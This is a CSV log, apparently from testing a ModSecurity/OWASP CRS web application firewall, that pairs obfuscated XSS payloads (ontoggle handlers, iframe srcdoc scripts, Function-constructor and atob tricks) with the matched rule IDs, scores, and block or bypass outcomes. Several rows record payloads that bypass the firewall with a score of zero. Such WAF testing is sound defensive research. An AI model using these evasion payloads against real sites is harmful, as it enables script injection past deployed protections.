index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
1435,<article><details open ontoggle=(function(){parent['ale'+'rt']`1`})()>,0,1,block,5,"934100,934100,941100,941120,949110","o33,11v217,70 || o33,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826674633.338916
1438,<details open ontoggle=Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826675323.374107
1439,<details open ontoggle=Function('\u0061l'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826675584.740747
1440,"<details open ontoggle=Function(String.fromCharCode(97,108)+'ert(1)')()>",0,1,block,5,"934100,934100,941100,941120,949110","o32,19v217,72 || o32,19v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826675791.757509
1441,<details open ontoggle=Function('al'+'\x65rt(1)')()>,0,1,bypass,2,"941100,941120","v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826675936.042249
1443,<details open ontoggle=window['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o29,29v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,18v217,59t:urlDecodeUni,t:compressWhitespace || ",20,177826676462.559649
1444,<details open ontoggle=top['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o26,29v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,15v217,56t:urlDecodeUni,t:compressWhitespace || ",20,177826676669.259461
1447,<details open ontoggle=Function('al'.concat('ert(1)'))()>,0,1,bypass,2,"941100,941120","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826677390.326713
1448,"<details open ontoggle=Function(['al','ert(1)'].join(''))()>",0,1,bypass,2,"941100,941120","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826677547.694831
1449,<details open ontoggle=Function(atob('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941120","v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826677751.879148
1453,<details open ontoggle=new/**/Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826678655.874191
1455,<details open ontoggle=Function('ale'+'rt'+'(1)')()>,0,1,bypass,2,"941100,941120","v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17782667904.363301
1456,<details open ontoggle=Function.prototype.constructor('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826679288.368016
1459,<details open ontoggle=window['Function']('ale'+'rt(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o29,29v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,18v217,59t:urlDecodeUni,t:compressWhitespace || ",20,177826679835.896697
1460,<details open ontoggle=self['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,16v217,57t:urlDecodeUni,t:compressWhitespace || ",20,177826680031.440187
1461,<details open ontoggle=parent['Function']('al'+'ert(1)')()>,0,1,block,4,"933210,941100,941120,949110","o29,29v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826680269.716685
1463,<details open ontoggle=globalThis.Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826680725.664940
1466,<details open ontoggle=(function(){})['constructor']('al'+'ert(1)')()>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o23,46v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,70 || o24,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826681344.065655
1469,"<details open ontoggle=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,4,"934100,941100,941120,949110","o32,19v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826682031.568128
1479,"<details open ontoggle=(0,Function)(atob('YWxlcnQoMSk='))()>",0,1,bypass,2,"941100,941120","v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826684152.178000
1489,"<details open ontoggle=(1,Function(atob('YWxlcnQoMSk=')))()>",0,1,bypass,2,"941100,941120","v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826686333.147549
1491,<details open ontoggle=globalThis['Function'](atob('YWxlcnQoMSk='))()>,0,1,block,4,"933210,941100,941120,949110","o33,36v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826686839.529688
1492,"<details open ontoggle=setTimeout(function(){Function(atob('YWxlcnQoMSk='))()},0)>",0,1,block,4,"934100,941100,941120,949110","o34,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826687018.534112
1502,"<details open ontoggle=setTimeout(function(){self[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,5,"934100,941100,941120,941370,949110","o34,11v217,141 || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,41v217,141t:urlDecodeUni,t:compressWhitespace || ",20,177826689142.648863
1510,"<details open ontoggle=setTimeout(function(){(0,eval)(String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,5,"933210,934100,941100,941120,949110","o33,74v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826690840.896914
1520,"<iframe src=""data:text/html,<script>setTimeout(function(){(function(){}).constructor('al'+'ert(1)')()},0)</script>"">",0,1,block,10,"932100,933210,934100,934100,941100,941110,941130,941160,941170,949110","o55,12v217,116 || o46,59v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,116 || o47,11v217,116t:urlDecodeUni || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177826693016.326962
1524,"<iframe src=""data:text/html,<script>setTimeout(function(){Reflect['construct'](Object['getPrototype'+'Of'](function(){})['constructo'+'r'],['al'+'ert(1)'])()},0)</script>"">",0,1,block,9,"933210,934100,934100,941100,941110,941130,941160,941170,949110","o46,115v217,172t:urlDecode,t:replaceComments,t:compressWhitespace || o47,11v217,172 || o47,11v217,172t:urlDecodeUni || v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177826693985.981608
1552,"<iframe srcdoc=""<script>(new(self.Function)('a'+'lert(1)'))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,34v217,72t:urlDecodeUni,t:cmdLine || o24,37v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782670006.170390
1554,"<iframe srcdoc=""<script>(new/**/(Function)('a'+'lert(1)'))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,33v217,71t:urlDecodeUni,t:cmdLine || o24,33v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826700553.948779
1557,"<iframe srcdoc=""<script>new(Function)('a'+'lert(1)')()</script>"">",0,1,block,5,"933210,941100,941110,941160,949110","o27,27v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826701185.763865
1558,"<iframe srcdoc=""<script>(Function('a'+'lert(1)'))()</script>"">",0,1,block,5,"932130,941100,941110,941160,949110","o22,24v217,62t:urlDecodeUni,t:cmdLine || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826701363.542608
1559,"<iframe srcdoc=""<script>(Function.call(0,'a'+'lert(1)'))()</script>"">",0,1,block,5,"932130,941100,941110,941160,949110","o22,31v217,69t:urlDecodeUni,t:cmdLine || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826701686.658221
1561,"<iframe srcdoc=""<script>(new(self['Function'])('a'+'lert(1)'))()</script>"">",0,1,block,7,"932130,933210,941100,941110,941160,941370,949110","o22,35v217,75t:urlDecodeUni,t:cmdLine || o24,40v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,16v217,75t:urlDecodeUni,t:compressWhitespace || ",30,177826702048.661338
1562,"<iframe srcdoc=""<script>(self['Function']('a'+'lert(1)'))()</script>"">",0,1,block,7,"932130,933210,941100,941110,941160,941370,949110","o22,30v217,70t:urlDecodeUni,t:cmdLine || o24,35v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,16v217,70t:urlDecodeUni,t:compressWhitespace || ",30,177826702271.040389
1563,"<iframe srcdoc=""<script>(new(top.Function)('a'+'lert(1)'))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,33v217,71t:urlDecodeUni,t:cmdLine || o24,36v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826702413.552222
1564,"<iframe srcdoc=""<script>(new(parent.Function)('a'+'lert(1)'))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,36v217,74t:urlDecodeUni,t:cmdLine || o24,39v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826702641.379744
1565,"<iframe srcdoc=""<script>(new(window['Function'])('a'+'lert(1)'))()</script>"">",0,1,block,7,"932130,933210,941100,941110,941160,941370,949110","o22,37v217,77t:urlDecodeUni,t:cmdLine || o24,42v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,18v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826702980.339026
1568,"<iframe srcdoc=""<script>(new(Function)(['a','lert(1)'].join('')))()</script>"">",0,1,block,6,"932130,933210,941100,941110,941160,949110","o22,38v217,78t:urlDecodeUni,t:cmdLine || o24,43v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826703543.922662
1652,"<iframe srcdoc=""<script>Function('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,69 || v217,69t:urlDecodeUni || ",25,177826721810.259100
1653,"<iframe srcdoc=""<script>[].constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,87 || v217,87t:urlDecodeUni || ",25,177826722066.200387
1655,"<iframe srcdoc=""<script>window['Function']('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"933210,941100,941110,941160,941370,949110","o30,29v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,79t:urlDecodeUni,t:compressWhitespace || ",25,177826722493.967270
1656,"<iframe srcdoc=""<script>self['Function']('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"933210,941100,941110,941160,941370,949110","o28,29v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177826722653.906328
1657,"<iframe srcdoc=""<script>(function(){this['ev'+'al']('ale'+'rt(1)')}).call(window)</script>""></iframe>",0,1,block,10,"932100,932130,933210,934100,934100,941100,941110,941160,941370,949110","o23,10v217,101 || o22,50v217,101t:urlDecodeUni,t:cmdLine || o24,57v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,101 || o25,11v217,101t:urlDecodeUni || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,15v217,101t:urlDecodeUni,t:compressWhitespace || ",45,177826722994.292301
1658,"<iframe srcdoc=""<script>with(window)Function('ale'+'rt(1)')()</script>""></iframe>",0,1,block,4,"941100,941110,941160,949110","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826723144.959866
1659,"<iframe srcdoc=""<script>Reflect.construct(Function,['ale'+'rt(1)'])()</script>""></iframe>",0,1,block,4,"941100,941110,941160,949110","v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826723313.193094
1666,"<iframe srcdoc=""<script>Array.constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,90 || v217,90t:urlDecodeUni || ",25,177826724841.372108
1667,"<iframe srcdoc=""<script>Object.constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,91 || v217,91t:urlDecodeUni || ",25,177826725054.199477
1668,"<iframe srcdoc=""<script>String.constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,6,"941100,941110,941160,942100,942100,949110","v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,91 || v217,91t:urlDecodeUni || ",25,177826725237.213927
1670,"<iframe srcdoc=""<script>({}).constructor.constructor('ale'+'rt(1)')()</script>""></iframe>",0,1,block,5,"932130,941100,941110,941160,949110","o22,42v217,89t:urlDecodeUni,t:cmdLine || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782672566.931105
